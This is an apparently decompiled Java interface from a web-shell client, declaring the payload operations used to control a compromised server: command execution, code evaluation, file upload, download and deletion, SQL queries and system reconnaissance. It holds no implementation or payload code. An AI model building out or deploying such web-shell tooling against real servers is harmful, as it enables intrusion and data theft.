package core.imp;

import core.shell.ShellEntity;
import util.http.ReqParameter;

public interface Payload {
   void init(ShellEntity var1);

   byte[] getPayload();

   String getFile(String var1);

   String[] listFileRoot();

   byte[] downloadFile(String var1);

   String getOsInfo();

   String getBasicsInfo();

   boolean include(String var1, byte[] var2);

   byte[] evalFunc(String var1, String var2, ReqParameter var3);

   String execCommand(String var1);

   boolean uploadFile(String var1, byte[] var2);

   boolean copyFile(String var1, String var2);

   boolean deleteFile(String var1);

   boolean moveFile(String var1, String var2);

   boolean newFile(String var1);

   boolean newDir(String var1);

   boolean test();

   String execSql(String var1, String var2, int var3, String var4, String var5, String var6, String var7);

   String[] getAllDatabaseType();

   String currentDir();

   String currentUserName();
}
